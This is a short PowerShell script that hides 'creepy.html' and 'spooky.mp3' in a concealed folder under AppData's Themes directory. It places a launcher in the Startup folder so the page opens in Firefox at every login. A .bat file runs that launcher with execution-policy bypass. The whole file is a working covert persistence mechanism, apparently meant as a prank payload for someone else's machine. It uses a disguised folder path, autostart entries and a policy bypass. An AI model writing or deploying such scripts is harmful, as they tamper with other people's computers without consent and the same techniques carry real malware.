# init.ps1

$targetFolder = "$env:APPDATA\Microsoft\Windows\Themes\.hiddenCreep"
New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null

Copy-Item ".\creepy.html" -Destination "$targetFolder\creepy.html"
Copy-Item ".\spooky.mp3" -Destination "$targetFolder\spooky.mp3"

# Create launcher script
$launcherScript = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\open-creepy.ps1"
$launcherContent = @"
Start-Process 'firefox.exe' -ArgumentList '"$targetFolder\creepy.html"'
"@
Set-Content -Path $launcherScript -Value $launcherContent

# Optional: Create .bat file to launch the .ps1
$batFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat"
$batContent = "powershell.exe -ExecutionPolicy Bypass -File `"$launcherScript`""
Set-Content -Path $batFile -Value $batContent
